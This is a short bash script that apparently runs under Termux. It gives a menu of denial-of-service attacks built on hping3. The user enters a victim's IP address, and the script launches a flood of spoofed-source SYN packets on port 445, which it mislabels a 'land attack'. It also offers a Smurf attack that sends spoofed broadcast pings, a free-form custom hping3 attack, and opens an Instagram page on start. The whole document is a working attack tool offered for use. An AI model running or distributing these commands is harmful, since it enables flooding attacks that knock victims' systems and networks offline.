#!/bin/bash
# coded by : HACKERSPUNK
# Thanks to kali.org

echo -e "\u001b[32mThis tool will only run if your machine is rooted"
sleep 5.0
clear

echo -e "\u001b[32m_______           ______   _______"
echo -e "\u001b[32m(  ____ \|\     /|(  __  \ (  ___  )"
echo -e "\u001b[32m| (    \/| )   ( || (  \  )| (   ) |"
echo -e "\u001b[32m| (_____ | |   | || |   ) || |   | |"
echo -e "\u001b[32m(_____  )| |   | || |   | || |   | |"
echo -e "\u001b[32m      ) || |   | || |   ) || |   | |"
echo -e "\u001b[32m/\____) || (___) || (__/  )| (___) |"
echo -e "\u001b[32m\_______)(_______)(______/ (_______)"
echo -e " "                                    
sleep 5.0
echo -e "\u001b[32m Follow Hackerspunk on Instagram"
termux-open-url https://www.instagram.com/myquotes.hb
clear

PS3='Please choose type of your attack: '
options=("DDOS Land Attack" "Smurf Attack" "Custom Attack" "Help with hping3" "Manual for hping3" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "DDOS Land Attack")
	echo "Input your victims IP"
    read foo
           sudo  hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source $foo
            ;;
        "Smurf Attack")
	echo "Input your victims IP"
	read foo1
	echo "Input broadcast IP"
	read bar
	##Smurf Attack: This is a type of denial-of-service attack that floods a target system via spoofed broadcast ping messages.
        sudo  hping3 -1 --flood -a $foo1 $bar
            ;;
    "Custom Attack")
    echo "Input your hping3 arguments" 
    read bar1
    sudo hping3 $bar1
    ;;
	"Help with hping3")
    hping3 --help
	;;
	"Manual for hping3")
	man hping3
	;;
         "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done
